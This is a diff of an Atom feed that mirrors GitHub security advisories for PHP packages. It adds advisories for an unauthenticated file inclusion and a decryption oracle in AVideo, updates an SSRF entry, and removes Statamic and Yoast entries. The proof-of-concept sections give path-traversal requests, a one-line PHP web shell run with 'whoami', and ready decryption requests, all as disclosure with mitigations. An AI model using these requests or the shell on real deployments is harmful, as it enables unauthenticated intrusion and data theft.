@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://xlordz.github.io/github-advisory-database-rss/composer.rss</id>
     <title>Security Advisory for PHP packages hosted at packagist.org</title>
-    <updated>2026-03-20T21:54:31.852Z</updated>
+    <updated>2026-03-20T22:20:13.692Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Acomposer"/>
     <subtitle>Security Advisory for PHP packages hosted at packagist.org on GitHub</subtitle>
@@ -11,6 +11,115 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[wwbn/avideo] AVideo has an Unauthenticated Local File Inclusion in API locale (RCE possible with writable PHP)]]></title>
+        <id>https://github.com/advisories/GHSA-8fw8-q79c-fp9m</id>
+        <link href="https://github.com/advisories/GHSA-8fw8-q79c-fp9m"/>
+        <updated>2026-03-20T21:55:37.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>An unauthenticated API endpoint (<code>APIName=locale</code>) concatenates user input into an <code>include</code> path with no canonicalization or whitelist. Path traversal is accepted, so arbitrary PHP files under the web root can be included. In our test this yielded confirmed file disclosure and code execution of existing PHP content (e.g., <code>view/about.php</code>), and it <em>can</em> escalate to RCE if an attacker can place or control a PHP file elsewhere in the tree. </p>
+<h3 id="details">Details</h3>
+<ul>
+<li>Entry point: <code>plugin/API/get.json.php</code> sets <code>$global['bypassSameDomainCheck']=1</code> and merges GET/POST/JSON into <code>$parameters</code> without authentication or API secret.</li>
+<li>Handler: <code>plugin/API/API.php</code>, method <code>get_api_locale()</code> (lines ~5009–5023):<pre><code class="language-php">$parameters['language'] = strtolower($parameters['language']);
+$file = "{$global['systemRootPath']}locale/{$parameters['language']}.php";
+if (!file_exists($file)) { return new ApiObject("This language does not exists"); }
+include $file;
+</code></pre>
+No validation is performed; <code>../</code> traversal is accepted.</li>
+<li>Because <code>include</code> executes PHP, any reachable PHP file is executed in the web server context.</li>
+</ul>
+<h3 id="poc">PoC</h3>
+<ol>
+<li>Fetch an arbitrary PHP file (no auth):<pre><code>GET /plugin/API/get.json.php?APIName=locale&amp;language=../view/about HTTP/1.1
+Host: &lt;target&gt;
+</code></pre>
+Response returns the rendered About page HTML, proving traversal outside <code>locale/</code>.</li>
+<li>RCE with an attacker PHP file (any writable PHP path):<pre><code>GET /plugin/API/get.json.php?APIName=locale&amp;language=../videos/locale/shell&amp;x=whoami
+</code></pre>
+If <code>shell.php</code> contains <code>&lt;?php system($_GET['x']); ?&gt;</code>, the response includes command output.</li>
+</ol>
+<h3 id="impact">Impact</h3>
+<ul>
+<li>Unauthenticated file inclusion of arbitrary PHP files under the web root.</li>
+<li>Confidential data leakage (e.g., configuration, secrets) via included PHP that renders output.</li>
+<li>Potential RCE <em>if</em> any attacker-writable PHP file exists elsewhere (not confirmed in this build).</li>
+<li>Affects any deployment with the API plugin enabled (default in docker-compose).</li>
+</ul>
+<h3 id="mitigation">Mitigation</h3>
+<ul>
+<li>Reject path separators/dots and enforce a strict allowlist of locale slugs.</li>
+<li><code>realpath</code> the target and ensure it stays within <code>$systemRootPath/locale</code>.</li>
+<li>Stop using <code>include</code> for translations; load data from vetted formats (JSON/array).</li>
+<li>Add authentication (API secret/token) to the endpoint as a secondary control.</li>
+</ul>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/WWBN/AVideo/security/advisories/GHSA-8fw8-q79c-fp9m">https://github.com/WWBN/AVideo/security/advisories/GHSA-8fw8-q79c-fp9m</a></li>
+<li><a href="https://github.com/advisories/GHSA-8fw8-q79c-fp9m">https://github.com/advisories/GHSA-8fw8-q79c-fp9m</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-8fw8-q79c-fp9m</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-03-20T21:55:31.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[wwbn/avideo] AVideo has an unauthenticated decrypt oracle leaking any ciphertext]]></title>
+        <id>https://github.com/advisories/GHSA-mwjc-5j4x-r686</id>
+        <link href="https://github.com/advisories/GHSA-mwjc-5j4x-r686"/>
+        <updated>2026-03-20T21:55:17.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>The API plugin exposes a <code>decryptString</code> action without any authentication. Anyone can submit ciphertext and receive plaintext. Ciphertext is issued publicly (e.g., <code>view/url2Embed.json.php</code>), so any user can recover protected tokens/metadata. Severity: High.</p>
+<h3 id="details">Details</h3>
+<ul>
+<li>Entry: <code>plugin/API/get.json.php</code> is unauthenticated.</li>
+<li>Handler: <code>plugin/API/API.php</code> <code>get_api_decryptString()</code> (lines ~5945–5966):<pre><code class="language-php">$string = decryptString($_REQUEST['string']);
+return new ApiObject($string, empty($string));
+</code></pre>
+No APISecret or user check occurs before decrypting.</li>
+<li>Public ciphertext source: <code>view/url2Embed.json.php</code> returns <code>playLink</code>/<code>playEmbedLink</code> (<code>encryptString(json_encode(...))</code>) to any caller.</li>
+</ul>
+<h3 id="poc">PoC</h3>
+<ol>
+<li>Obtain ciphertext:<pre><code>GET /view/url2Embed.json.php?url=https://example.com/video.mp4
+</code></pre>
+Copy <code>playLink</code>.</li>
+<li>Decrypt without auth:<pre><code>POST /plugin/API/get.json.php?APIName=decryptString
+Content-Type: application/x-www-form-urlencoded
+
+string=&lt;playLink ciphertext&gt;
+</code></pre>
+Response contains the plaintext JSON (videoLink, title, users_id, etc.).</li>
+</ol>
+<h3 id="impact">Impact</h3>
+<ul>
+<li>Any encrypted payload produced by the platform can be decrypted by anyone.</li>
+<li>Leaks tokens/links intended to be confidential; enables replay and tampering where secrecy was assumed.</li>
+</ul>
+<h3 id="mitigation">Mitigation</h3>
+<ul>
+<li>Require API secret or authenticated/authorized user for <code>decryptString</code>, or remove the endpoint.</li>
+<li>Prefer one-way signatures (HMAC) instead of exposing generic decryption.</li>
+<li>Rotate encryption keys/salts after patch to invalidate exposed ciphertexts.</li>
+</ul>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/WWBN/AVideo/security/advisories/GHSA-mwjc-5j4x-r686">https://github.com/WWBN/AVideo/security/advisories/GHSA-mwjc-5j4x-r686</a></li>
+<li><a href="https://github.com/advisories/GHSA-mwjc-5j4x-r686">https://github.com/advisories/GHSA-mwjc-5j4x-r686</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-mwjc-5j4x-r686</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-03-20T21:55:12.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[dreamfactory/df-core] DreamFactory has a directory traversal]]></title>
         <id>https://github.com/advisories/GHSA-gv7f-w92j-383q</id>
@@ -288,7 +397,7 @@ if (empty($_POST['globalToken']) || !verifyToken($_POST['globalToken'])) {
         <title type="html"><![CDATA[[wwbn/avideo] AVideo has Unauthenticated SSRF via plugin/Live/test.php]]></title>
         <id>https://github.com/advisories/GHSA-3fpm-8rjr-v5mc</id>
         <link href="https://github.com/advisories/GHSA-3fpm-8rjr-v5mc"/>
-        <updated>2026-03-20T20:57:57.000Z</updated>
+        <updated>2026-03-20T22:07:02.000Z</updated>
         <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
 <p>An unauthenticated server-side request forgery vulnerability in <code>plugin/Live/test.php</code> allows any remote user to make the AVideo server send HTTP requests to arbitrary URLs. This can be used to probe localhost/internal services and, when reachable, access internal HTTP resources or cloud metadata endpoints.</p>
 <h3 id="details">Details</h3>
@@ -1814,59 +1923,5 @@ $passEncoded = password_hash($pass, PASSWORD_DEFAULT);
         </author>
         <category label="severity" term="CRITICAL"/>
         <published>2026-03-20T20:43:50.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[statamic/cms] Statamic is vulnerable to account takeover via password reset link injection]]></title>
-        <id>https://github.com/advisories/GHSA-jxq9-79vj-rgvw</id>
-        <link href="https://github.com/advisories/GHSA-jxq9-79vj-rgvw"/>
-        <updated>2026-03-19T21:10:39.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="impact">Impact</h2>
-<p>An attacker may leverage a vulnerability in the password reset feature to capture a user's token and reset the password on their behalf.</p>
-<p>The attacker must know the email address of a valid account on the site, and the actual user must blindly click the link in their email even though they didn't request the reset.</p>
-<h2 id="patches">Patches</h2>
-<p>This has been fixed in 6.7.1 and 5.73.10.</p>
-<p>Note that a follow-up report showed the original 6.3.3 fix to be insufficient. The 5.73.10 fix was sufficient.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/statamic/cms/security/advisories/GHSA-jxq9-79vj-rgvw">https://github.com/statamic/cms/security/advisories/GHSA-jxq9-79vj-rgvw</a></li>
-<li><a href="https://github.com/statamic/cms/commit/6fdd03324982848e8754f2edd2265262d361714e">https://github.com/statamic/cms/commit/6fdd03324982848e8754f2edd2265262d361714e</a></li>
-<li><a href="https://github.com/statamic/cms/commit/78e63dfcf705b116d5ac0f7f7f5a1a69be63d1be">https://github.com/statamic/cms/commit/78e63dfcf705b116d5ac0f7f7f5a1a69be63d1be</a></li>
-<li><a href="https://github.com/statamic/cms/commit/b2be592ddfb588bcb88c9be454f3590e14b145b0">https://github.com/statamic/cms/commit/b2be592ddfb588bcb88c9be454f3590e14b145b0</a></li>
-<li><a href="https://github.com/statamic/cms/releases/tag/v5.73.10">https://github.com/statamic/cms/releases/tag/v5.73.10</a></li>
-<li><a href="https://github.com/statamic/cms/releases/tag/v6.3.3">https://github.com/statamic/cms/releases/tag/v6.3.3</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-27593">https://nvd.nist.gov/vuln/detail/CVE-2026-27593</a></li>
-<li><a href="https://github.com/advisories/GHSA-jxq9-79vj-rgvw">https://github.com/advisories/GHSA-jxq9-79vj-rgvw</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-jxq9-79vj-rgvw</uri>
-        </author>
-        <category label="severity" term="CRITICAL"/>
-        <published>2026-02-24T21:09:23.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[yoast/duplicate-post] Yoast Duplicate Post has an Authenticated (Contributor+) Missing Authorization to Arbitrary Post Duplication and Overwrite]]></title>
-        <id>https://github.com/advisories/GHSA-g9w4-m5fx-x3wv</id>
-        <link href="https://github.com/advisories/GHSA-g9w4-m5fx-x3wv"/>
-        <updated>2026-03-19T19:37:41.000Z</updated>
-        <content type="html"><![CDATA[<p>The Yoast Duplicate Post plugin for WordPress is vulnerable to unauthorized modification of data due to a missing capability check on the clone_bulk_action_handler() and republish_request() functions in all versions up to, and including, 4.5. This makes it possible for authenticated attackers, with Contributor-level access and above, to duplicate any post on the site including private, draft, and trashed posts they shouldn't have access to. Additionally, attackers with Author-level access and above can use the Rewrite &amp; Republish feature to overwrite any published post with their own content.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-1217">https://nvd.nist.gov/vuln/detail/CVE-2026-1217</a></li>
-<li><a href="https://plugins.trac.wordpress.org/browser/duplicate-post/tags/4.5/src/handlers/bulk-handler.php#L115">https://plugins.trac.wordpress.org/browser/duplicate-post/tags/4.5/src/handlers/bulk-handler.php#L115</a></li>
-<li><a href="https://plugins.trac.wordpress.org/browser/duplicate-post/tags/4.5/src/post-republisher.php#L128">https://plugins.trac.wordpress.org/browser/duplicate-post/tags/4.5/src/post-republisher.php#L128</a></li>
-<li><a href="https://www.wordfence.com/threat-intel/vulnerabilities/id/05f175e6-08a9-4199-948c-5bd8b3caaa39?source=cve">https://www.wordfence.com/threat-intel/vulnerabilities/id/05f175e6-08a9-4199-948c-5bd8b3caaa39?source=cve</a></li>
-<li><a href="https://github.com/advisories/GHSA-g9w4-m5fx-x3wv">https://github.com/advisories/GHSA-g9w4-m5fx-x3wv</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-g9w4-m5fx-x3wv</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-03-18T12:31:51.000Z</published>
     </entry>
 </feed>
